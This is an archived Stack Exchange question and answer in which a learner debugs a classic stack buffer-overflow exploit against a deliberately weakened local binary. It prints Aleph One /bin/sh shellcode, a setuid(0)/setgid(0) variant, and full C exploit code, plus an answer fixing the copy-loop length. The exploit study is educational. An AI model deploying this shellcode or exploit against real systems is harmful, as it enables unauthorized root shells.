{
    "title": "Why always get the message \"Illegal Instruction (core dumped)\"?",
    "link": "https://reverseengineering.stackexchange.com/questions/15384/why-always-get-the-message-illegal-instruction-core-dumped",
    "content": "I tried to exploiting buffer overflow. In the exploit code\nI use the <pre><code>Aleph-One</code></pre> shellcode.\n<pre><code>\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n\"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"\n</code></pre>\nExploitation is normal, but I modified a little shellcode\nIn order to execute <pre><code>setuid(0)</code></pre> and <pre><code>setgid(0)</code></pre>, on exploit\nI have changed the owner of the exploit into <pre><code>root</code></pre>.\n<pre><code>\"\\x31\\xdb\\x89\\xd8\\xb0\\x17\\xcd\\x80\" // setuid(0)\n\"\\x31\\xdb\\x89\\xd8\\xb0\\x2e\\xcd\\x80\" // setgid(0)\n\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n\"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"\n</code></pre>\nWhen in execution, I get the message <pre><code>Illegal Instruction (core dumped)</code></pre>\nNote:\n\nI have disabled ASLR\nThe vulnerable and exploit programs are compiled using flag   <pre><code>-fno-stack-protector -z execstack -mpreferred-stack-boundary=2</code></pre>\n\nComplete exploit code :\n<pre><code>#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n\nchar *prog = \"./bof4\";\nchar shellcode[] = \n   //\"\\xeb\\x0appssssffff\"\n   \"\\x31\\xdb\\x89\\xd8\\xb0\\x17\\xcd\\x80\"\n   \"\\x31\\xdb\\x89\\xd8\\xb0\\x2e\\xcd\\x80\"\n   \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n   \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n   \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\n\nint main (int argc, char **argv) {\n    char buff[111];\n    int i, j;\n    int addr;\n\n    if (argc > 1)\n            sscanf(*(argv+1), \"%x\", &addr);\n    else\n            exit(0);\n    for (i = 0; i < 35; i++) {\n            *(buff+i) = 0x90;\n    }\n    for (j = 0; j < 45; j++, i++) {\n            *(buff+i) = *(shellcode+j);\n    }\n    for (; i + 4 < 110; i += 4) {\n            memcpy(buff+i, &addr, 4);\n    }\n    buff[108] = 0;\n    fwrite(buff, strlen(buff), 1, stdout);\n}\n</code></pre>\nCan anyone explain ?\n",
    "votes": "1",
    "answers": 1,
    "views": "1k",
    "tags": [
        "x86",
        "linux",
        "exploit",
        "buffer-overflow"
    ],
    "user": "Febriyanto Nugroho",
    "time": "May 20, 2017 at 9:17",
    "comments": [],
    "answers_data": [
        {
            "content": "Just by guessing as you has the core dump and could check that for sure.\nIsn't your issue that the exploit was 45 bytes long and this is what you iterate in the second loop and now when you added more code (<pre><code>setuid(0)</code></pre> & <pre><code>setgid(0)</code></pre>) the loop just finishes in the middle? \nExtend your second loop by 16 and check.\n<pre><code>for (j = 0; j < 61; j++, i++) {\n    *(buff+i) = *(shellcode+j);\n}\n</code></pre>\n",
            "votes": "0",
            "user": "Paweł Łukasik",
            "time": "May 20, 2017 at 7:02",
            "is_accepted": true,
            "comments": [
                {
                    "user": "Febriyanto Nugroho",
                    "text": "<span class=\"comment-copy\">Why I get <code>Segmentation fault (core dumped)</code> ? Do I have to change <code>35</code> bytes on the first loop ?</span>",
                    "time": null
                },
                {
                    "user": "Paweł Łukasik",
                    "text": "<span class=\"comment-copy\">the first loop looks like nop-sled, I don't think it matters. If you have the dump can you check where it fails?</span>",
                    "time": null
                },
                {
                    "user": "Febriyanto Nugroho",
                    "text": "<span class=\"comment-copy\">I do not have core file</span>",
                    "time": null
                },
                {
                    "user": "Paweł Łukasik",
                    "text": "<span class=\"comment-copy\">set the <code>ulimit</code> and repeat. The core should be created</span>",
                    "time": null
                }
            ]
        }
    ]
}